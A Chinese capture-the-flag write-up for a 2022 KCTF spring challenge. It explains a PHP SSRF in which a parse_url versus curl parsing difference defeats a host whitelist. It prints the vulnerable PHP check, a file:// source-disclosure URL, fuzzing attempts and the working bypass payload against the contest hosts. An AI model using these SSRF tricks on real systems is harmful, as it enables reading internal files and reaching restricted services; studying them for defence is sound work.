---
title: 看雪2022 KCTF 春季赛 | 第四题设计思路及解析
contest: 看雪2022 KCTF春季赛
year: 2022
difficulty: medium
vuln_type: ssrf
tags: [PHP SSRF, parse_url与curl差异, file://协议读源码, 跨目录flag.php, IP白名单绕, 砍传奇回忆杀]
attack_chain: url.php?url=file://127.0.0.1/var/www/html/url.php读源码→发现curl_request+注释flag.php地址→phpinfo得知PHP 7.3.11→利用parse_url与curl解析差异→123.57.254.42://127.0.0.1/../flag.php构造SSRF打flag.php
key_payload: "file://127.0.0.1/var/www/html/url.php;parse_url vs curl解析差异;123.57.254.42://127.0.0.1/../flag.php;scheme=123.57.254.42 host=127.0.0.1 path=/../flag.php"
one_liner: KCTF2022春Q4《飞蛾扑火》SSRF：parse_url与curl解析差异+123.57.254.42://127.0.0.1/../flag.php
lesson: parse_url+curl组合的SSRF用scheme://host/path格式绕host白名单
quality: high
---

# 看雪2022 KCTF 春季赛 | 第四题设计思路及解析

**赛事**：看雪2022 KCTF春季赛 Q4《飞蛾扑火》

**难度**：围观2573人，19队破解，一血47min（mininepRe战队）

**题目设计**：
- phpinfo.php + url.php?url=
- 注释提示：`//echo curl_request("http://123.57.254.42/flag.php","get",[],true,5);//get flag`
- 但该地址限制IP访问
- 需要通过SSRF从靶机发起请求

**源码泄露**：
```
url.php?url=file://127.0.0.1/var/www/html/url.php
```
**关键源码**：
```php
$url = $_GET["url"];
$uu = parse_url($url);
$host = isset($uu["host"]) ? $uu["host"] : "";
$scheme = isset($uu["scheme"]) ? $uu["scheme"] : "";
if (empty($host)) die("host is null");
if (empty($scheme)) die("scheme is null");
if ($host == "ctf.pediy.com" || $host == "127.0.0.1" || $host == "localhost") {
    echo curl_request($url, '', "get", [], true, 5);
} else {
    die("host not allow");
}
```

**parse_url vs curl 解析差异**：
- **parse_url视角**：
  - `123.57.254.42` → scheme
  - `127.0.0.1` → host
  - `../flag.php` → path
- **curl视角**：
  - `123.57.254.42` → host（自动补全http://）
  - `/127.0.0.1/../flag.php` → path

**payload**：
```
http://101.89.140.207:8044/url.php?url=123.57.254.42://127.0.0.1/../flag.php
```

**为什么能绕**：
- parse_url把123.57.254.42当scheme → host=127.0.0.1 → 通过白名单
- curl把123.57.254.42当host → 实际访问123.57.254.42/127.0.0.1/../flag.php

**fuzz思路**（不成功）：
```
http://u:p@123.57.254.42@127.0.0.1/http://123.57.254.42#@127.0.0.1/
http://123.57.254.42{%00-%FF}{%00-%FF}127.0.0.1/...
```

**真实payload**：
```
123.57.254.42://127.0.0.1/../flag.php
```

**技术总结**：
- parse_url + curl 解析差异是经典SSRF
- `scheme://host/path` 格式巧妙绕host白名单
- file:// 协议读源码
- 灵感来源：渗透时数据库AES key放在http://xxx.com/key，访问限制IP

**质量评估**：高（差异解析对比图清晰 + payload有效）
